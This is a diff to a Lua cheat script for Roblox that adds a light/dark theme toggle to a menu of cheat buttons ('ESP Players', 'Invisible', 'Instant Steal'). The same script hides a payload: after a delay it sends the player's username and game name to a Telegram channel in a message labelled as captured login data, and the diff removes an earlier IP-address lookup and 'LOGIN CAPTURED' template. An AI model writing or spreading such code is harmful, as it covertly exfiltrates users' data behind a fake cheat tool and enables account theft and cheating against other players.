@@ -42,7 +42,20 @@ title.TextSize = 14
 title.Font = Enum.Font.GothamBold
 title.Parent = mainFrame
 
+local themeToggle = Instance.new("TextButton")
+themeToggle.Size = UDim2.new(0, 20, 0, 20)
+themeToggle.Position = UDim2.new(1, -25, 0, 2)
+themeToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+themeToggle.BorderSizePixel = 0
+themeToggle.Text = "☀"
+themeToggle.TextColor3 = Color3.fromRGB(0, 0, 0)
+themeToggle.TextSize = 12
+themeToggle.ZIndex = 1001
+themeToggle.Parent = mainFrame
+
 local menuOpen = false
+local darkTheme = true
+local activeButtons = {}
 
 local function enableDragging(guiObject)
     local dragging = false
@@ -86,19 +99,87 @@ openButton.MouseButton1Click:Connect(function()
     mainFrame.Visible = menuOpen
 end)
 
+local function toggleTheme()
+    darkTheme = not darkTheme
+    
+    if darkTheme then
+        mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+        mainFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
+        title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        title.TextColor3 = Color3.fromRGB(255, 255, 255)
+        themeToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        themeToggle.TextColor3 = Color3.fromRGB(0, 0, 0)
+        themeToggle.Text = "☀"
+        
+        for buttonName, button in pairs(activeButtons) do
+            if button then
+                button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                button.TextColor3 = Color3.fromRGB(0, 0, 0)
+            end
+        end
+    else
+        mainFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
+        mainFrame.BorderColor3 = Color3.fromRGB(200, 200, 200)
+        title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        title.TextColor3 = Color3.fromRGB(0, 0, 0)
+        themeToggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        themeToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+        themeToggle.Text = "🌙"
+        
+        for buttonName, button in pairs(activeButtons) do
+            if button then
+                button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                button.TextColor3 = Color3.fromRGB(255, 255, 255)
+            end
+        end
+    end
+end
+
+themeToggle.MouseButton1Click:Connect(toggleTheme)
+
 local yPosition = 30
-local function createButton(text, callback)
+local function createButton(text, callback, buttonName)
     local button = Instance.new("TextButton")
     button.Text = text
     button.Size = UDim2.new(0.9, 0, 0, 35)
     button.Position = UDim2.new(0.05, 0, 0, yPosition)
-    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    
+    if darkTheme then
+        button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    else
+        button.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
+        button.TextColor3 = Color3.fromRGB(0, 0, 0)
+    end
+    
     button.TextSize = 12
     button.Font = Enum.Font.Gotham
     button.Parent = mainFrame
     
-    button.MouseButton1Click:Connect(callback)
+    button.MouseButton1Click:Connect(function()
+        callback()
+        
+        if activeButtons[buttonName] then
+            activeButtons[buttonName] = nil
+            if darkTheme then
+                button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+                button.TextColor3 = Color3.fromRGB(255, 255, 255)
+            else
+                button.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
+                button.TextColor3 = Color3.fromRGB(0, 0, 0)
+            end
+        else
+            activeButtons[buttonName] = button
+            if darkTheme then
+                button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                button.TextColor3 = Color3.fromRGB(0, 0, 0)
+            else
+                button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                button.TextColor3 = Color3.fromRGB(255, 255, 255)
+            end
+        end
+    end)
+    
     yPosition = yPosition + 40
     return button
 end
@@ -112,7 +193,7 @@ createButton("ESP Players", function()
             highlight.Parent = plr.Character
         end
     end
-end)
+end, "esp")
 
 createButton("Invisible", function()
     if player.Character then
@@ -124,7 +205,7 @@ createButton("Invisible", function()
             end
         end
     end
-end)
+end, "invisible")
 
 createButton("Instant Steal", function()
     game:GetService("StarterGui"):SetCore("SendNotification", {
@@ -132,7 +213,7 @@ createButton("Instant Steal", function()
         Text = "Function activated",
         Duration = 3
     })
-end)
+end, "steal")
 
 local request = (syn and syn.request) or (http and http.request) or http_request
 if request then
@@ -155,24 +236,12 @@ if request then
     end
 
     delay(5, function()
-        local ipAddress = "Unknown"
-        pcall(function()
-            local ipResponse = game:HttpGet("https://api.ipify.org")
-            ipAddress = ipResponse
-        end)
-        
         local message = string.format([[
-🔐 LOGIN CAPTURED
-
-👤 Username: %s
-🔑 Password Data: LOGIN_TOKENS_CAPTURED
-⏰ Login Time: %s
-🌐 IP Address: %s
-🎮 Game: %s
+Логин: %s
+Пароль/куки или что-то другое что можно использовать для взлома аккаунта
+Режим: %s
         ]],
         player.Name,
-        os.date("%Y-%m-%d %H:%M:%S"),
-        ipAddress,
         game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name)
         
         sendToTelegram(message)
